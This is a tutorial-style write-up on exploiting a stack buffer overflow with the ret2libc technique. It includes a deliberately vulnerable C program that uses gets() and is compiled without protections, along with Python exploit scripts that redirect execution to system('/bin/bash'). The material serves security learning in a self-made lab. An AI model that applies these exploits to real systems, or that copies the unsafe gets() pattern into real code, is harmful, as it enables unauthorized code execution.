# EXPLOITS
## STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc)
## REQUIRED TO UNDERSTAND : Stack buffer overflow to overwrite registers backups especially to redirect code execution
## Can't work if : 
```
> ASLR is enabled (because if it's on, the C function from libc address will be randomized)
Note that it's still possible to exploit even if it's enabled but really hard because of randomization)
Note that it's not the case if the libc is staticly linked (using the C flag "-static") because then, all the libc code will be included in the code and it's not ASLR that will prevent this attack in this case but PIE, because all the libc code will be included in the .text
```
## Bypasses protection : 
```
> NX (non executable) because we're not executing any shellcode
```
ret2libc attack is not so hard, what we're going to do for this attack is just to jump to a C function from the libc, as good as the attack name describes, so for example, if we wanna execute a shell, we could use the `system(const char* command)` and give it parameter "/bin/bash" any any other shell to get it  
But wait, how are aguments are passed in C ? Well, there are accessed through the stack  
Oh and also, if we want the program to include the `system()` function, we have to include the `<stdlib.h>` header !!  
For example, if we want to execute thefunction `system()` which takes one argument, we have to organize the stack like this :
```
(If we have multiple arguments they're upper here...)
Argument 1 (4 bytes (or 8 in 64 bits)) -> Address of the buffer where there is the command ("/bin/bash")
Return after function to execute (4 bytes (or 8 in 64 bits)) -> Any address
EIP (or RIP) backup (4 bytes (or 8 in 64 bits)) -> Address of the function to execute (here system())
EBP (or RBP) backup (4 bytes (or 8 in 64 bits)) -> Any address 
...
BUFFER (x bytes) -> Overflow
```
So let's consider this type of code :
```c
#include <stdio.h>
#include <stdlib.h> //IMPORTANT !!!
...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
	printf("Address of buffer : %p\n", buffer); //You could also use gdb to find this but the problem with this debugger is that address are shifted with and without gdb so it will be very annoying to find the address
}
...
void main()
{
	...
	<function>();
	...
}
```
To compile it :
```bash
gcc <source code file.c> -o <executable> -fno-stack-protector -m32
# I also added -m32 flag to compile in 32 bits, it's not required, but it makes exploitation easier
# You should also disable ASLR
```
To get `system()` function address with gdb :
```
gdb <executable>
# GDB :
break <ADDRESS OF <function>>
run
print &system
```

Now the exploit :
```python
# exploit.py file :
import struct

payload = 'A'*<BUFFER SIZE> # To fill the buffer with 'A'
payload += 'B'*<OFFSSET> # Offset just before we overwrite instruction pointer backup (RIP or EIP) (example : for me it's 12)
payload += struct.pack("I", <SYSTEM FUNCTION ADDRESS>) # "I" should be "Q" in 64 bits
payload += <ADDRESS OF THE FUNCTION WHERE TO JUMP TO AFTER THE LIBC FUNCTION>
# Will jump to this address after the execution of the libc command Can be anything, even an invalid memory address, example : "CCCC"
# 4 bytes (or 8 in 64 bits)
print(payload)
```
Hmmm, only one thing's left, the argument which is the command to execute, well, we just have to pass a memory address that contains "/bin/bash" or the command we wanna execute, there's a couple of tricks to do that, the most soft one is to create an environment variable using `export <ENVIRONMENT VARIABLE NAME>=/bin/bash` but it's hard to explain, and it's extremely annoying to do because of the address shift of GDB, but it's the best way  
But alternatively, you could just make sure that "/bin/bash" exists in the memory for whatever valid reason, to keep things simple and objective, we're gonna just add it derectely in the .bss section of the program like that :
```c
#include <stdio.h>
#include <stdlib.h> //IMPORTANT !!!

char command[] = "/bin/bash"

...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
	printf("Address of buffer : %p\n", buffer); //You could also use gdb to find this but the problem with this debugger is that address are shifted with and without gdb so it will be very annoying to find the address
}
...
void main()
{
	...
	<function>();
	...
}
```
I added it in the .bss section because if i put it in the stack, it will shift the other addresses, which will be annoying
So now we're just gonna set the argument 1 to the address of the `command` buffer (to get the `command` address there's a couple of ways, you could just print it using `printf("%s", command);` for example)
Then all is ready, here's the final exploit :
```python
# exploit.py file :
import struct

payload = 'A'*<BUFFER SIZE> # To fill the buffer with 'A'
payload += 'B'*<OFFSSET> # Offset just before we overwrite instruction pointer backup (RIP or EIP) (example : for me it's 12)
payload += struct.pack("I", <SYSTEM FUNCTION ADDRESS>) # "I" should be "Q" in 64 bits
payload += <ADDRESS OF THE FUNCTION WHERE TO JUMP TO AFTER THE LIBC FUNCTION> 
# Will jump to this address after the execution of the libc command Can be anything, even an invalid memory address, example : "CCCC"
# 4 bytes (or 8 in 64 bits)
payload += <ADDRESS OF THE BUFFER WHERE THERE IS THE COMMAND>
print(payload)
```
Now to use the exploit :
```bash
python exploit.py | ./vuln
# If for example you used the shellcode that exits the program and you don't get a segmentation fault, it means that it worked
# If you used a shellcode to spawn a shell and it doesn't work it's either that it gives a segmentation fault without opening anything or it actually opens the shell but closing it, to solve this problem you can use this command :
(python exploit.py ; cat) | ./vuln
```

Here's the main.c i used :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char command[] = "/bin/bash";

void vuln() //It has to be on another function, NOT MAIN() !!!
{
  char buffer[64]; //buffer to overflow
  gets(buffer); // Can have a buffer overflow (even scanf("%s", buffer) works)
  printf("&command : %p\n", command);
  printf("&system address : %p\n", system);
}
int main()
{
  vuln(); //Main calls vuln() 
}
```
Here's the exploit.py i used :
```
import struct

command = "/bin/bash" # BUFFER
payload = command + '\x00'*(64 - len(command))
payload += "B"*12
#payload += "CCCC"
payload += struct.pack("I", 0xf7e11420) # system() address
payload += "CCCC"
payload += struct.pack("I", 0x0804c020) # command variable address

print(payload)
```
